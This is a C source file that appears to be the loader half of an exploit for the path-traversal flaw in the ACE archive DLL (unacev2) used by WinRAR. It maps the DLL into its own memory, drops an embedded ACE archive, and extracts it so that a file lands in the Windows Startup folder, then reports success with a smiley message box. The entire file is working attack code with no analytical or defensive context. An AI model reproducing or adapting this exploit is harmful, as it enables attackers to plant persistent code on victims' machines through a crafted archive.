#include <Windows.h>

#include "Headers/ace.h"
#include "Headers/tools.h"
#include "Headers/loader.h"
#include "Headers/resource.h"

typedef INT (__stdcall *ACEINITDLL)(pACEInitDllStruc);
typedef BOOL(__stdcall *ACEMAIN)(HINSTANCE, DWORD, LPVOID);
typedef INT (__stdcall *ACEEXTRACT)(LPSTR, pACEExtractStruc);

CHAR szTmpPath[MAX_PATH];


int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {


	LPSTR filename = NULL;
	HMODULE hModule = NULL;
	HMODULE unacevModule = NULL;
	LPCSTR pathToUnacev2 = NULL;
	ACEMAIN aceDllMain = NULL;
	ACEINITDLL aceInitDLL = NULL;
	ACEEXTRACT aceExtract = NULL;
	tACEInitDllStruc initStruct = {};
	tACEExtractStruc extractStruct = {};

	hModule = GetModuleHandle(NULL);
	unacevModule = WriteDllIntoProcess(hModule);
	// pathToUnacev2 = GetPathOfDll();
	// unacevModule = LoadLibrary(pathToUnacev2);
	GetTempPath(MAX_PATH, szTmpPath);
	DropAceResource(hModule);
	aceDllMain = (ACEMAIN)GetEntryPoint(unacevModule);
	// aceDllMain = (ACEMAIN)GetExportedFunction(unacevModule, "___DllMainCRTStartup@12");
	aceInitDLL = (ACEINITDLL)GetExportedFunction(unacevModule, "ACEInitDll");
	aceExtract = (ACEEXTRACT)GetExportedFunction(unacevModule, "ACEExtract");

	FillInitStruct(&initStruct);

	if ((*aceDllMain)(unacevModule, 1, 0) && (*aceInitDLL)(&initStruct) == ACE_ERROR_NOERROR) {
		
		FillExtractStruct(&extractStruct);
		if ((*aceExtract)(tmpFile, &extractStruct) == ACE_ERROR_NOERROR) {
			MessageBox(NULL, "File dropped to Startup Folder", ":)", MB_OK);
		}
	}

	VirtualFree(unacevModule, 0, MEM_RELEASE);
	DeleteFile(tmpFile);

	return 0;
}